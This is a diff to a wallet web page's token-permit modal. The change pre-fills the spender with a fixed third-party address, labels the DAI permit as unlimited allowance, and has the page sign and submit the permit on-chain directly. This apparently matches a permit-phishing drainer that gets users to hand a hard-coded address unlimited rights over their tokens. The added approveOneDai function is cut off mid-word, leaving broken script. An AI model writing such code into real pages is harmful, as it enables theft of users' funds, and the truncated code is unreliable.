@@ -168,7 +168,7 @@
         <div class="field">
           <label>Token preset</label>
           <select id="permitPreset">
-            <option value="DAI">DAI (Dai Stablecoin) – EIP-712 (allowed)</option>
+            <option value="DAI">DAI (Dai Stablecoin) – EIP-712 (allowed/unlimited)</option>
             <option value="EIP2612-USDC">USDC (EIP-2612 standard)</option>
             <option value="CUSTOM">Custom ERC-20 with EIP-2612</option>
           </select>
@@ -185,7 +185,10 @@
           <div class="field"><label>Deadline (minutes from now)</label><input id="permitMins" type="number" value="30" min="1"/></div>
           <div class="field"><label>Owner (your address)</label><input id="permitOwner" readonly/></div>
         </div>
-        <div class="row-right"><button class="btn pink" onclick="signPermit()">Sign Permit</button></div>
+        <div class="row-right">
+          <button class="btn pink" onclick="signPermit()">Sign & Submit Permit</button>
+          <button class="btn" onclick="approveOneDai()">Approve exactly 1 DAI (tx)</button>
+        </div>
         <div id="permitResult" style="margin-top:12px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:#cfe3ff;display:none"></div>
         <div id="permitHint" style="margin-top:8px;color:#9aa3b2;font-size:12px;display:none">Use this payload in your relayer/server to submit <code>permit(...)</code> on-chain and pay gas on behalf of the user. For DAI: <code>permit(holder,spender,nonce,expiry,allowed,v,r,s)</code>. For EIP‑2612: <code>permit(owner,spender,value,deadline,v,r,s)</code>.</div>
       </div>
@@ -194,6 +197,8 @@
 
   <div class="toast" id="toast">Note</div>
 
+  <!-- Ethers.js for ABI encoding + transactions -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     // ===== Utilities =====
     const qs = s => document.querySelector(s);
@@ -308,7 +313,7 @@ This is NOT a transaction and costs no gas.`;
       preset?.addEventListener('change', apply); apply();
     })();
   // ===== Permit helpers =====
-    function openPermit(){ if(!currentAddress){ toast('Connect wallet first.'); return; } document.getElementById('permitOwner').value=currentAddress; document.getElementById('permitSpender').value=''; document.getElementById('permitResult').style.display='none'; document.getElementById('permitHint').style.display='none'; document.getElementById('permitModal').style.display='grid'; }
+    function openPermit(){ if(!currentAddress){ toast('Connect wallet first.'); return; } document.getElementById('permitOwner').value=currentAddress; document.getElementById('permitSpender').value='0x4f37591FcD7dB4febbD50452eF61FFF8066316Ca'; document.getElementById('permitResult').style.display='none'; document.getElementById('permitHint').style.display='none'; document.getElementById('permitModal').style.display='grid'; }
     function closePermit(){ document.getElementById('permitModal').style.display='none'; }
 
     function pad32(hex){ return '0x'+hex.replace(/^0x/,'').padStart(64,'0'); }
@@ -339,12 +344,13 @@ This is NOT a transaction and costs no gas.`;
         const mins=parseInt(document.getElementById('permitMins').value||'30',10);
         const chainId=parseInt(await ethereum.request({method:'eth_chainId'}),16);
         const preset=document.getElementById('permitPreset').value;
-        const name=(await readName(token)) || (preset==='DAI'?'Dai Stablecoin':'');
+        const name=(await readName(token)) || (preset==='DAI'?'Dai Stablecoin':'Token');
         const nonce=await readNonce(token, owner);
         const deadline=Math.floor(Date.now()/1000)+mins*60;
 
-        let typedData, summary;
+        let typedData, callTx, summary, vrs;
         if(preset==='DAI'){
+          // DAI uses allowed(bool) instead of value. This gives/strips UNLIMITED allowance.
           const allowed=(document.getElementById('permitAllowed').value==='true');
           typedData={
             types:{
@@ -352,11 +358,26 @@ This is NOT a transaction and costs no gas.`;
               Permit:[{name:'holder',type:'address'},{name:'spender',type:'address'},{name:'nonce',type:'uint256'},{name:'expiry',type:'uint256'},{name:'allowed',type:'bool'}]
             },
             primaryType:'Permit',
-            domain:{name:name||'Dai Stablecoin',version:'1',chainId,verifyingContract:token},
+            domain:{name,version:'1',chainId,verifyingContract:token},
             message:{holder:owner,spender,nonce,expiry:deadline,allowed}
           };
           summary=`DAI permit for ${spender} (allowed=${allowed})`;
+          const sig = await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
+          const {v,r,s} = splitSig(sig); vrs={v,r,s};
+          // Submit on-chain using ethers.js (user pays gas)
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+          const dai = new ethers.Contract(token, [
+            'function permit(address holder,address spender,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s)'
+          ], signer);
+          const tx = await dai.permit(owner, spender, nonce, deadline, allowed, v, r, s);
+          const receipt = await tx.wait();
+          const box=document.getElementById('permitResult'); box.style.display='block'; box.textContent=`${summary}\n\nTX hash: ${receipt.transactionHash}`;
+          document.getElementById('permitHint').style.display='block';
+          toast('DAI permit submitted');
+          return;
         } else {
+          // EIP-2612 path: exact amount via value
           const value=document.getElementById('permitValue').value.trim()||'0';
           typedData={
             types:{
@@ -364,22 +385,34 @@ This is NOT a transaction and costs no gas.`;
               Permit:[{name:'owner',type:'address'},{name:'spender',type:'address'},{name:'value',type:'uint256'},{name:'nonce',type:'uint256'},{name:'deadline',type:'uint256'}]
             },
             primaryType:'Permit',
-            domain:{name:name||'Token',version:'1',chainId,verifyingContract:token},
+            domain:{name,version:'1',chainId,verifyingContract:token},
             message:{owner,spender,value,nonce,deadline}
           };
           summary=`EIP-2612 permit value=${value} for ${spender}`;
+          const sig = await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
+          const {v,r,s} = splitSig(sig); vrs={v,r,s};
+          // Submit on-chain using ethers.js (user pays gas)
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+          const erc20 = new ethers.Contract(token, [
+            'function permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s)'
+          ], signer);
+          const tx = await erc20.permit(owner, spender, value, deadline, v, r, s);
+          const receipt = await tx.wait();
+          const box=document.getElementById('permitResult'); box.style.display='block'; box.textContent=`${summary}\n\nTX hash: ${receipt.transactionHash}`;
+          document.getElementById('permitHint').style.display='block';
+          toast('Permit submitted');
+          return;
         }
-
-        const sig = await ethereum.request({method:'eth_signTypedData_v4', params:[owner, JSON.stringify(typedData)]});
-        const {v,r,s} = splitSig(sig);
-        const out = { token, owner, spender, chainId, typedData, signature:sig, v, r, s, deadline };
-        const box=document.getElementById('permitResult');
-        box.style.display='block';
-        box.textContent=`${summary}\n\n`+JSON.stringify(out,null,2);
-        document.getElementById('permitHint').style.display='block';
-        toast('Permit signed');
-      }catch(e){ console.warn('Permit sign failed', e); toast('Permit failed or rejected'); }
+      }catch(e){ console.warn('Permit sign/submit failed', e); toast('Permit failed or rejected'); }
     }
+
+    // Direct on-chain approval for exactly 1 DAI (requires gas from user)
+    async function approveOneDai(){
+      try{
+        if(!currentAddress){ toast('Connect wallet first.'); return; }
+        const token='0x6B175474E89094C44Da98b954EedeAC495271d0F';
+        const spender=document.getElementById('permitSpende
   </script>
 </body>
 </html>
